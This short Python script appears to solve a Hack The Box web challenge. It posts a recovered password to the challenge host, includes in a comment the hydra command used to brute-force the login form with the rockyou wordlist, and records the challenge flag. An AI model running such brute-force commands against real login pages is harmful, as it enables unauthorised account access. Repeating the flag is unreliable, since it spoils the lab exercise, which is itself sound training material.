#!/usr/bin/python
import requests,re,hashlib


host="http://docker.hackthebox.eu:38115"
r=requests.session()
s=r.get(host)

data={'password':'leonardo'}
flag=r.post(url=host,data=data)

print(flag.text)
#hydra docker.hackthebox.eu -l admin -P /usr/share/wordlists/rockyou.txt http-post-form '/:password=^PASS^:Invalid password!' -s 38115 -V

#HTB{l1k3_4_b0s5_s0n}
